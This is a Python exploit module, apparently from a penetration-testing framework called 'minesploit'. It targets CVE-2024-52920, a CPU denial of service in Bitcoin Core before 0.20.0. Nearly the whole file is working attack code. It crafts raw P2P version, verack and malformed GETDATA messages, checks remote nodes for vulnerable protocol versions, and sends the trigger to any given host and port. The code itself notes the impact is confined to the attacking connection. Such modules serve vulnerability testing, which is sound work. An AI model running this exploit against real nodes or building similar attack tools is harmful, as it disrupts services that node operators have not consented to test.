"""CVE-2024-52920: Bitcoin Core GETDATA CPU DoS

This vulnerability allows remote attackers to cause a denial of service
via an infinite loop in ProcessGetData() when handling GETDATA messages
with invalid INV types (type 0).

Reference: https://bitcoincore.org/en/2024/07/03/disclose-getdata-cpu/
Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-52920

Affected: Bitcoin Core < 0.20.0
Fixed: Bitcoin Core 0.20.0 (June 3, 2020)
Severity: LOW (Bitcoin Core assessment) / HIGH (CISA-ADP: 7.5)
"""

import asyncio
import hashlib
import struct
from typing import cast

from minesploit.framework import Exploit, ExploitMeta, ExploitResult


class CVE_2024_52920_GETDATA_CPU_DOS(Exploit):
    meta = ExploitMeta(
        name="CVE-2024-52920: Bitcoin Core GETDATA CPU DoS",
        cve="CVE-2024-52920",
        cvss_score=7.5,
        severity="HIGH",
        affected_versions="Bitcoin Core < 0.20.0",
        discovered_by="John Newbery",
        disclosure_date="2024-07-03",
        description=(
            "Bitcoin Core before 0.20.0 allows remote attackers to cause a denial of service "
            "(infinite loop in ProcessGetData, 100% CPU) via a GETDATA message with an "
            "unknown/invalid inventory type (type 0). The vulnerability only affects the "
            "attacker's connection, causing 100% CPU on that thread and increasing per-peer "
            "memory by ~1.5MB."
        ),
        references=[
            "https://bitcoincore.org/en/2024/07/03/disclose-getdata-cpu/",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-52920",
        ],
    )

    def __init__(self):
        super().__init__()

    def _create_version_message(self, version: int = 70015) -> bytes:
        magic = b"\xf9\xbe\xb4\xd9"
        command = b"version\x00\x00\x00\x00\x00"

        payload = struct.pack("<I", version)
        payload += b"\x00" * 8
        payload += struct.pack("<Q", 0)
        payload += b"\x00" * 10
        payload += struct.pack("<Q", 0)
        payload += b"\x00" * 8
        payload += b"\x00"
        payload += b"\x00" * 10
        payload += b"\x00" * 24

        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]

        return magic + command + struct.pack("<I", len(payload)) + checksum + payload

    def _create_verack_message(self) -> bytes:
        magic = b"\xf9\xbe\xb4\xd9"
        command = b"verack\x00\x00\x00\x00\x00\x00"
        payload = b""
        checksum = b"\x00\x00\x00\x00"
        return magic + command + struct.pack("<I", len(payload)) + checksum + payload

    def _create_getdata_invalid_inv(self) -> bytes:
        magic = b"\xf9\xbe\xb4\xd9"
        command = b"getdata\x00\x00\x00\x00"

        payload = struct.pack("<I", 1)
        payload += struct.pack("<I", 0)
        payload += b"\x00" * 32

        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]

        return magic + command + struct.pack("<I", len(payload)) + checksum + payload

    def _parse_version_from_response(self, data: bytes) -> int | None:
        try:
            if len(data) < 48:
                return None
            command = data[4:12]
            if command == b"version\x00\x00\x00":
                version: int = cast(int, struct.unpack("<I", data[40:44])[0])
                return version
            return None
        except Exception:
            return None

    async def check(self, target: str, port: int = 8333, **kwargs) -> ExploitResult:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=10.0,
            )

            version_msg = self._create_version_message()
            writer.write(version_msg)
            await writer.drain()

            response = await asyncio.wait_for(reader.read(4096), timeout=10.0)

            writer.close()
            await writer.wait_closed()

            if not response or len(response) < 48:
                return ExploitResult(
                    False,
                    "No valid Bitcoin Core version response received",
                )

            protocol_version = self._parse_version_from_response(response)

            if protocol_version is not None:
                if protocol_version < 0x0C8000:
                    return ExploitResult(
                        True,
                        f"Bitcoin Core detected with protocol version {protocol_version} - "
                        f"may be vulnerable (< 0.20.0)",
                        {"vulnerable": True, "protocol_version": protocol_version},
                    )
                else:
                    return ExploitResult(
                        False,
                        f"Bitcoin Core protocol version {protocol_version} appears patched (>= 0.20.0)",
                        {"vulnerable": False, "protocol_version": protocol_version},
                    )

            return ExploitResult(
                True,
                "Bitcoin Core node detected - version unknown",
                {"vulnerable": None, "service": "bitcoind"},
            )

        except asyncio.TimeoutError:
            return ExploitResult(False, "Connection timed out")
        except ConnectionRefusedError:
            return ExploitResult(False, "Connection refused")
        except Exception as e:
            return ExploitResult(False, f"Error: {str(e)}")

    async def exploit(
        self,
        target: str,
        port: int = 8333,
        **kwargs,
    ) -> ExploitResult:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=10.0,
            )

            version_msg = self._create_version_message()
            writer.write(version_msg)
            await writer.drain()

            response = await asyncio.wait_for(reader.read(4096), timeout=10.0)

            if not response or len(response) < 48:
                writer.close()
                await writer.wait_closed()
                return ExploitResult(False, "No version response from target")

            verack_msg = self._create_verack_message()
            writer.write(verack_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(4096), timeout=10.0)

            getdata_msg = self._create_getdata_invalid_inv()
            writer.write(getdata_msg)
            await writer.drain()

            await asyncio.sleep(1)

            writer.close()
            await writer.wait_closed()

            return ExploitResult(
                True,
                f"Sent invalid GETDATA (INV type 0) to {target}:{port}. "
                "This should trigger 100% CPU on the targeted connection thread. "
                "Note: The DoS only affects the attacker's own connection, not the entire node.",
                {"exploit_sent": True},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(self, target: str, port: int = 8333, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            (
                "Verification requires monitoring the target node. The exploit causes: "
                "1) 100% CPU usage on the attacking peer's connection thread "
                "2) ~1.5MB memory increase per affected connection. "
                "The impact is LIMITED - only the attacker's connection is affected, "
                "other peers continue to work normally. "
                "Bitcoin Core considers this LOW severity for this reason."
            ),
        )
